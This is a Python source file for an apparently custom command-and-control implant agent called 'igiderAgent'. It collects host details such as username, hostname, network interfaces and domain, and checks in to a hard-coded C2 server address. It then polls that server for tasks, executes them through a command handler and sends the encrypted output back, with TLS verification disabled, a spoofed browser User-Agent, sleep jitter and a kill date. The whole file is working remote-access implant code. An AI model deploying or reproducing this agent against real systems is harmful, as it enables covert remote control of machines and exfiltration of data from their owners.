#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import json
import os
import platform
import random
import socket
import sys
import time
import uuid
from datetime import datetime
import traceback
import requests
import ssl
import netifaces
import logging
from typing import Dict, List, Any, Union

from igider_encryption import EncryptionModule
from igider.agent_functions.command_handler import handle_command

# Configuration will be inserted at build time
AGENT_CONFIG = json.loads("""#{AGENT_CONFIG}#""")

class igiderAgent:
    def __init__(self):
        self.uuid = str(uuid.uuid4())
        self.hostname = socket.gethostname()
        self.username = self._get_username()
        self.platform = platform.system()
        self.architecture = platform.machine()
        self.pid = os.getpid()
        self.ppid = os.getppid() if hasattr(os, 'getppid') else 0
        self.debug = AGENT_CONFIG.get("debug", False)
        self.callback_interval = AGENT_CONFIG.get("callback_interval", 5)
        self.kill_date = AGENT_CONFIG.get("kill_date", "")

        self.use_encryption = AGENT_CONFIG.get("use_encryption", True)
        if self.use_encryption:
            self.encryption = EncryptionModule()

        self.server_url = None
        self.http_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Accept": "*/*",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache"
        }

        if self.debug:
            logging.basicConfig(
                level=logging.DEBUG,
                format="%(asctime)s - [%(levelname)s] - %(message)s",
                handlers=[logging.StreamHandler()]
            )
        else:
            logging.basicConfig(level=logging.ERROR)

        self.tasks = {}
        self.running = True
        self.jitter = random.uniform(0, 0.5)
        self.interfaces = self._get_interfaces()
        self.log("Agent initialized successfully")

    def _get_username(self) -> str:
        return os.environ.get("USERNAME") or os.environ.get("USER") or "unknown"

    def _get_interfaces(self) -> List[Dict[str, Any]]:
        interfaces = []
        try:
            for interface in netifaces.interfaces():
                addresses = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addresses:
                    for address in addresses[netifaces.AF_INET]:
                        interfaces.append({
                            "name": interface,
                            "ip": address.get("addr", ""),
                            "netmask": address.get("netmask", "")
                        })
        except Exception as e:
            self.log(f"Error getting network interfaces: {str(e)}", level="error")
        return interfaces

    def _get_local_ip(self) -> str:
        for interface in self.interfaces:
            if interface["ip"] and not interface["ip"].startswith("127."):
                return interface["ip"]
        return "unknown"

    def log(self, message: str, level: str = "info") -> None:
        if self.debug:
            getattr(logging, level)(message)

    def check_kill_date(self) -> bool:
        if not self.kill_date:
            return False
        try:
            kill_date = datetime.strptime(self.kill_date, "%Y-%m-%d")
            return datetime.now() > kill_date
        except:
            return False

    def checkin(self) -> Dict[str, Any]:
        checkin_data = {
            "action": "checkin",
            "ip": self._get_local_ip(),
            "os": self.platform,
            "user": self.username,
            "host": self.hostname,
            "pid": self.pid,
            "uuid": self.uuid,
            "architecture": self.architecture,
            "domain": socket.getfqdn(),
            "process_name": sys.executable,
            "interfaces": self.interfaces
        }
        self.log(f"Checkin data: {checkin_data}")
        return checkin_data

    def encrypt_data(self, data: Union[Dict, str]) -> str:
        if isinstance(data, dict):
            data = json.dumps(data)
        return self.encryption.encrypt(data) if self.use_encryption else base64.b64encode(data.encode()).decode()

    def decrypt_data(self, data: str) -> Dict:
        try:
            decrypted = self.encryption.decrypt(data) if self.use_encryption else base64.b64decode(data.encode()).decode()
            return json.loads(decrypted)
        except Exception as e:
            self.log(f"Error decrypting data: {str(e)}", level="error")
            return {}

    def send_response(self, task_id: str, status: str, output: str = "") -> None:
        try:
            response_data = {
                "action": "response",
                "task_id": task_id,
                "status": status,
                "output": output
            }
            self.log(f"Sending response for task {task_id}: {status}")
            encrypted_data = self.encrypt_data(response_data)
            response = self._send_to_c2(encrypted_data)
            if response.get("status") == "success":
                self.log(f"Response for task {task_id} sent successfully")
            else:
                self.log(f"Failed to send response for task {task_id}", level="error")
        except Exception as e:
            self.log(f"Error sending response: {str(e)}", level="error")

    def _send_to_c2(self, data: str) -> Dict:
        try:
            if not self.server_url:
                self.log("No C2 server URL configured", level="error")
                return {"status": "error", "message": "No C2 server URL configured"}

            response = requests.post(
                self.server_url,
                headers=self.http_headers,
                data=data,
                verify=False, 
                timeout=10
            )

            if response.status_code == 200:
                return self.decrypt_data(response.text)
            else:
                self.log(f"C2 server returned status code {response.status_code}", level="error")
                return {"status": "error", "message": f"C2 server returned {response.status_code}"}
        except requests.exceptions.RequestException as e:
            self.log(f"Error sending data to C2: {str(e)}", level="error")
            return {"status": "error", "message": str(e)}

    def get_tasks(self) -> List[Dict]:
        try:
            request_data = {
                "action": "get_tasks",
                "uuid": self.uuid
            }
            encrypted_data = self.encrypt_data(request_data)
            response = self._send_to_c2(encrypted_data)
            if response.get("status") == "success" and "tasks" in response:
                return response["tasks"]
            else:
                return []
        except Exception as e:
            self.log(f"Error getting tasks: {str(e)}", level="error")
            return []

    def process_tasks(self, tasks: List[Dict]) -> None:
        for task in tasks:
            try:
                task_id = task.get("id")
                command = task.get("command")
                parameters = task.get("parameters", {})
                if not task_id or not command:
                    continue
                self.log(f"Processing task {task_id}: {command}")
                args = parameters.get("args", "")
                result = handle_command(command, args)
                self.send_response(task_id, "completed", result)
            except Exception as e:
                self.log(f"Error processing task: {str(e)}", level="error")
                if task_id:
                    self.send_response(task_id, "error", str(e))

    def run(self, server_url: str) -> None:
        self.server_url = server_url

        try:
            checkin_data = self.checkin()
            encrypted_data = self.encrypt_data(checkin_data)
            response = self._send_to_c2(encrypted_data)

            if not response or response.get("status") != "success":
                self.log("Initial checkin failed", level="error")
                return

            self.log("Initial checkin successful")

            if "uuid" in response:
                self.uuid = response["uuid"]
                self.log(f"UUID updated from C2: {self.uuid}")

        except Exception as e:
            self.log(f"Error during initial checkin: {str(e)}", level="error")
            return

        while self.running:
            try:
                if self.check_kill_date():
                    self.log("Kill date reached, exiting")
                    break
                tasks = self.get_tasks()
                if tasks:
                    self.process_tasks(tasks)
                sleep_time = self.callback_interval + (self.callback_interval * self.jitter)
                time.sleep(sleep_time)
            except Exception as e:
                self.log(f"Error in main loop: {str(e)}", level="error")
                time.sleep(self.callback_interval)

        self.log("Agent shutting down")


def main():
    C2_SERVER_URL = "https://192.168.79.5:7443/api/v1.4/callback"
    agent = igiderAgent()
    agent.run(C2_SERVER_URL)


if __name__ == "__main__":
    main()